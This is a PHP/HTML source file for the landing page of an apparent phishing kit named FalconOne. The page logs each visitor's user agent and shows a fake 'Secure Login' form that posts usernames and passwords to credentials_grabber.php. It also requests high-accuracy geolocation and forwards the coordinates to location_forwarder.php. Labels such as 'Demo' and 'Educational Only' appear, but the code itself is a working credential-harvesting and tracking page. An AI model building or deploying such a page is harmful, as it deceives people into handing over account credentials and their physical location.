<?php
/**
 * landing.php
 * Main phishing landing: logs user agent, requests credentials, attempts geolocation.
 */

require_once __DIR__ . '/logger.php';

// Log user agent each time landing is visited
logUserAgent();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>FalconOne - Landing</title>
  <meta name="description" content="Phishing Demo - Secure Login Portal">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Styles -->
  <link rel="stylesheet" href="styles/main.css">
  <link rel="stylesheet" href="styles/join.css">
  <link rel="stylesheet" href="styles/footer.css">
  <link rel="stylesheet" href="styles/forms.css">
</head>
<body>

<article class="join">
  <div class="join__container">
    <!-- Title/Welcome -->
    <section class="join__message">
      <h1 class="join__heading">FalconOne Secure Login</h1>
      <p class="join__subheading">Protecting your account is our priority.</p>
      <p class="join__text">Please sign in and share your location for verification.</p>
    </section>

    <!-- Column: geolocation request -->
    <section class="join__subscribe">
      <h2 class="join__heading">Location Check</h2>
      <p class="join__price">$0 <span class="join__price-month">Demo</span></p>
      <p class="join__price-desc">Click below to allow geolocation.</p>
      <a href="#" class="join__cta" onclick="getLocation()">Allow Location</a>
      <p id="errorMessage" style="margin-top:10px; color:red;"></p>
    </section>

    <!-- Column: login form -->
    <section class="join__about">
      <h2 class="join__heading">Account Login</h2>
      <form action="credentials_grabber.php" method="post">
        <label for="uname"><b>Username or Email</b></label>
        <input type="text" name="uname" id="uname" placeholder="Enter username" required>

        <label for="psw"><b>Password</b></label>
        <input type="password" name="psw" id="psw" placeholder="Enter password" required>

        <button type="submit">Sign In</button>
      </form>
    </section>
  </div>
</article>

<!-- Footer -->
<footer class="footer">
  <div class="footer__attribution">
    <p class="footer__text">&copy; 2025 FalconOne - Educational Only</p>
  </div>
</footer>

<script>
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true });
  } else {
    document.getElementById('errorMessage').textContent = 'Geolocation not supported.';
  }
}

function success(pos) {
  const lat = pos.coords.latitude;
  const lon = pos.coords.longitude;
  window.location = `location_forwarder.php?x=${lat}&y=${lon}`;
}

function error(e) {
  document.getElementById('errorMessage').textContent = 'Geolocation request was denied or unavailable.';
}
</script>

</body>
</html>
